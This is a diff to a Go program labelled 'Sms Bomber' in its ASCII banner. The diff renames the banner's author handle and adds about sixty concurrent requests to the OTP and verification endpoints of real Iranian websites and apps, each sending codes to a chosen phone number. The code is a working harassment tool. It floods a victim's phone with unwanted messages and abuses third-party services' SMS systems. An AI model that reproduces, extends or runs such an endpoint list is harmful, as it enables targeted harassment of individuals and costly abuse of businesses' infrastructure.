@@ -70,7 +70,7 @@ func main() {
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#              
             -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:              
              *@@%#            -@@@@@@.            #@@@+               
-             .%@@# @esfelurm  +@@@@@@= Sms Bomber #@@#                
+             .%@@# @DarkPack  +@@@@@@= Sms Bomber #@@#                
               :@@*           =%@@@@@@%-           *@@:                
               #@@%         .*@@@@#%@@@%+.         %@@+                
               %@@@+      -#@@@@@* :%@@@@@*-      *@@@*                
@@ -705,6 +705,294 @@ func main() {
 		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
 			"PhoneNumber": phone,
 		}, ch)
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+    "source": "besina",
+    "mobile": phone,
+}, ch)
+
+go sms("https://www.portal.ir/site/api/v1/user/otp", map[string]interface{}{
+    "template_id": 11111111,
+    "type": "etc",
+    "category": "etc",
+    "mobile": phone,
+    "name": " ",
+}, ch)
+
+go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
+    "username": phone,
+}, ch)
+
+go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
+    "cellphone": strings.Replace(phone, "0", "+98", 1),
+}, ch)
+
+go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
+    "Parameters": map[string]interface{}{
+        "ApplicationType": "Web",
+        "ApplicationUniqueToken": "null",
+        "ApplicationVersion": "1.0.0",
+        "MobileNumber": phone,
+        "UniqueToken": "null",
+    },
+}, ch)
+
+go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
+    "phone": strings.TrimLeft(phone, "0"),
+}, ch)
+
+go sms("https://football360.ir/api/auth/verify-phone/", map[string]interface{}{
+    "phone_number": strings.Replace(phone, "0", "+98", 1),
+}, ch)
+
+go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+    "method": "phone",
+    "identifier": strings.Replace(phone, "0", "+98", 1),
+    "type": "register",
+}, ch)
+
+go sms("https://www.snapptrip.com/register", map[string]interface{}{
+    "lang": "fa",
+    "country_id": "860",
+    "password": "12345678",
+    "mobile_phone": strings.Replace(phone, "0", "98", 1),
+    "country_code": "+98",
+    "email": "a@gmail.com",
+}, ch)
+
+go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
+    "contact": phone,
+}, ch)
+
+go sms("https://core.gapfilm.ir/api/v3.1/Account/Login", map[string]interface{}{
+    "Type": 3,
+    "Username": strings.TrimLeft(phone, "0"),
+    "SourceChannel": "GF_WebSite",
+    "SourcePlatform": "desktop",
+    "SourcePlatformAgentType": "Chrome",
+    "SourcePlatformVersion": "111.0.0.0",
+    "GiftCode": "null",
+}, ch)
+
+go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://api.tapsi.cab/api/v2.2/user", map[string]interface{}{
+    "credential": map[string]interface{}{
+        "phoneNumber": phone,
+        "role": "PASSENGER",
+    },
+    "otpOption": "SMS",
+}, ch)
+
+go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://api.ostadkr.com/login", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://www.technolife.ir/shop", map[string]interface{}{
+    "query": `query check_customer_exists($username: String ,$repeat:Boolean){ check_customer_exists(username: $username , repeat:$repeat){ result request_id } }`,
+    "variables": map[string]interface{}{
+        "username": phone,
+    },
+    "g-recaptcha-response": "",
+}, ch)
+
+go sms("https://www.hamrah-mechanic.com/api/v1/membership/otp", map[string]interface{}{
+    "PhoneNumber": phone,
+    "prevDomainUrl": "https://www.google.com/",
+    "landingPageUrl": "https://www.hamrah-mechanic.com/",
+    "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
+    "prevUrl": "https://www.hamrah-mechanic.com/",
+    "referrer": "https://www.google.com/",
+}, ch)
+
+go sms("https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
+    "number": phone,
+}, ch)
+
+go sms("https://auth.basalam.com/otp-request", map[string]interface{}{
+    "mobile": phone,
+    "client_id": 11,
+}, ch)
+
+go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
+    "phone_number": phone,
+}, ch)
+
+go sms("https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+phone, nil, ch)
+
+go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
+    "phoneNumberCode": "+98",
+    "CellPhone": phone,
+    "CaptchaKey": "null",
+    "JustMobilephone": strings.TrimLeft(phone, "0"),
+}, ch)
+
+go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://api.sibche.com/profile/sendCode", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://apiwebsite.shavaz.com/Auth/SendConfirmCode", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://account.bama.ir/api/otp/generate/v2", map[string]interface{}{
+    "CellNumber": phone,
+    "Appname": "bamawebapplication",
+    "smsfor": 6,
+}, ch)
+
+go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
+    "phoneNumber": phone,
+}, ch)
+
+go sms("https://core.gap.im/v1/user/add.json?mobile=%2B"+strings.Replace(phone, "0", "+98", 1), nil, ch)
+
+go sms("https://www.karlancer.com/api/register", map[string]interface{}{
+    "phone": strings.TrimLeft(phone, "0"),
+    "role": "freelancer",
+}, ch)
+
+go sms("https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", map[string]interface{}{
+    "telephone": phone,
+}, ch)
+
+go sms("https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
+    "phone_number": phone,
+}, ch)
+
+go sms("https://igame.ir/api/play/otp/send", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://tahrir-online.ir/wp-admin/admin-ajax.php", map[string]interface{}{
+    "phone": "+98" + phone,
+    "form": "register",
+    "action": "mobix_send_otp_code",
+}, ch)
+
+go sms("https://hermeskala.com//login/send_vcode", map[string]interface{}{
+    "mobile_number": phone,
+}, ch)
+
+go sms("https://ickala.com/", map[string]interface{}{
+    "controller": "SendSMS",
+    "fc": "module",
+    "module": "loginbymobile",
+    "SubmitSmsSend": "1",
+    "ajax": "true",
+    "otp_mobile_num": phone,
+}, ch)
+
+go sms("https://nikanbike.com/?rand="+phone, map[string]interface{}{
+    "controller": "authentication",
+    "back": "my-account",
+    "fc": "module",
+    "ajax": "true",
+    "module": "iverify",
+    "phone_mobile": phone,
+    "SubmitCheck": "",
+}, ch)
+
+go sms("https://www.kanoonbook.ir/store/customer_otp", map[string]interface{}{
+    "customer_username": phone,
+    "task": "customer_phone",
+}, ch)
+
+go sms("https://app.itoll.com/api/v1/auth/login", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
+go sms("https://gitamehr.ir/wp-admin/admin-ajax.php", map[string]interface{}{
+    "action": "stm_login_register",
+    "type": "mobile",
+    "input": phone,
+}, ch)
+
+go sms("https://4hair.ir/user/login.php", map[string]interface{}{
+    "num": phone,
+    "ok": "",
+}, ch)
+
+go sms("https://rirabook.com/loginAth", map[string]interface{}{
+    "mobile1": phone,
+    "loginbt1": "",
+}, ch)
+
+go sms("https://www.tamimpishro.com/site/api/v1/user/otp", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", map[string]interface{}{
+    "telephone": phone,
+}, ch)
+
+go sms("https://www.atrinelec.com/ajax/SendSmsVerfiyCode", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://api.digighate.com/v2/public/code", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://api.pooshakshoniz.com/v1/customer/register-login", map[string]interface{}{
+    "phone_number": phone,
+}, ch)
+
+go sms("https://api.benedito.ir/v1/customer/register-login", map[string]interface{}{
+    "phone_number": phone,
+}, ch)
+
+go sms("https://www.rubeston.com/api/customers/login-register", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://azarbadbook.ir/ajax/login_j_ajax_ver/", map[string]interface{}{
+    "username": phone,
+    "btn_login": "login",
+}, ch)
+
+go sms("https://myroz.ir/wp-admin/admin-ajax.php", map[string]interface{}{
+    "action": "stiles_woocommerce_login_popup_get_code",
+    "mobile": phone,
+}, ch)
+
+go sms("https://titomarket.com/index.php?route=account/login_verify/verify", map[string]interface{}{
+    "phone": phone,
+}, ch)
+
+go sms("https://shimashoes.com/api/customer/member/register/", map[string]interface{}{
+    "mobile": phone,
+}, ch)
+
 
 	}
 
